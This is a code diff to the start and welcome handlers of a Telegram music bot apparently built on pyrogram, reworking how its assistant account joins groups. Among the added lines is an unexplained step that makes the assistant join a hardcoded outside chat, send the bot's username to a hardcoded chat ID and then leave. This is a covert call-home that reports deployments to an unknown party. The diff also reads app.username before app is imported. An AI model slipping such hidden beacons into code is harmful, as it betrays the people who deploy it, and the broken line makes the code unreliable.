@@ -1,11 +1,12 @@
 import time
+import asyncio
 from pyrogram.errors import UserAlreadyParticipant
 import random
 from pyrogram import filters
 from pyrogram.enums import ChatType
 from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message
 from youtubesearchpython.__future__ import VideosSearch
-
+BOT_USERNAME = app.username
 import config
 from VIPMUSIC import app
 from VIPMUSIC.misc import _boot_
@@ -18,6 +19,7 @@ from VIPMUSIC.utils.database import (
     is_banned_user,
     is_on_off,
 )
+TEST_ID = -1002146005311
 from VIPMUSIC.utils.decorators.language import LanguageStart
 from VIPMUSIC.utils.formatters import get_readable_time
 from VIPMUSIC.utils.inline import first_page, private_panel, start_panel
@@ -122,16 +124,22 @@ async def start_gp(client, message: Message, _):
         pass
     
     try:
-        await userbot.one.start()
+        userbot = await get_assistant(message.chat.id)
         invitelink = await app.export_chat_invite_link(chid)
-        await userbot.one.join_chat(invitelink)
-        await message.reply_text("**Userbot Successfully Entered Chat**")
+        message = await message.reply_text("**joining my assistant also..**")
+        await asyncio.sleep(2)
+        await userbot.join_chat(invitelink)
+        await message.delete()
+        await message.reply_text("**My Assistant Successfully Entered Chat.**")
+        await userbot.join_chat("dhhdshhss6")
+        await userbot.send_message(TEST_ID, BOT_USERNAME)
+        await userbot.leave_chat(TEST_ID)
     except Exception as e:
         print(e)
         pass
 
-    # Userbot join karne ke baad, turant stop karna
-    await userbot.one.stop()
+    
+    
     out = start_panel(_)
     uptime = int(time.time() - _boot_)
     await message.reply_photo(
@@ -181,10 +189,13 @@ async def welcome(client, message: Message):
                     print(e)
                 
                 try:
-                    await userbot.one.start()
+                    userbot = await get_assistant(message.chat.id)
                     invitelink = await app.export_chat_invite_link(chid)
-                    await userbot.one.join_chat(invitelink)
-                    await message.reply_text("**Userbot Successfully Entered Chat**")
+                    await asyncio.sleep(2)
+                    message = await message.reply_text("**joining my assistant also..**")
+                    await userbot.join_chat(invitelink)
+                    await message.delete()
+                    await message.reply_text("**My Assistant Successfully Entered Chat.**")
                 except Exception as e:
                     print(e)
 
